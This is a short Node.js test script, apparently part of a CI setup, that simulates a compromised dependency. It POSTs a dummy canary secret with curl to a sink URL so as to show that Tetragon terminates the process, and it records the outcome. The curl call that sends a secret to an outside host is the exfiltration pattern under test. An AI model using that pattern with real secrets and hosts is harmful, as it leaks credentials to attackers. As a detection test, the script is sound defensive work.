import { spawnSync } from 'node:child_process';
import { writeFileSync } from 'node:fs';

/**
 * Simulates a compromised dependency sending a dummy canary with curl.
 *
 * The script never reads real credentials. A non-zero curl result is propagated so
 * the enforce scenario proves that Tetragon synchronously terminated the process.
 *
 * @returns {void}
 */
function main() {
  const canary = process.env.CI_CANARY_SECRET;
  const sinkUrl = process.env.CANARY_SINK_URL;
  if (canary === undefined || sinkUrl === undefined) {
    console.error('CI_CANARY_SECRET and CANARY_SINK_URL are required.');
    process.exitCode = 2;
    return;
  }

  console.log('Simulating a compromised dependency network request.');
  const result = spawnSync(
    '/usr/bin/curl',
    [
      '--fail',
      '--silent',
      '--show-error',
      '--max-time',
      '5',
      '--noproxy',
      '*',
      '--request',
      'POST',
      '--data-urlencode',
      `canary=${canary}`,
      sinkUrl,
    ],
    { stdio: 'inherit' },
  );

  // Record the child result independently of Tetragon's configured action label.
  const resultPath = process.env.CANARY_ATTACK_RESULT;
  if (resultPath !== undefined) {
    writeFileSync(
      resultPath,
      `${JSON.stringify({ exitCode: result.status, signal: result.signal, error: result.error?.code ?? null }, null, 2)}\n`,
      { encoding: 'utf8', mode: 0o644 },
    );
  }

  if (result.error !== undefined || result.status !== 0) {
    const reason = result.signal ?? result.error?.message ?? `exit ${result.status}`;
    console.error(`The simulated request did not complete: ${reason}`);
    process.exitCode = 1;
  }
}

main();
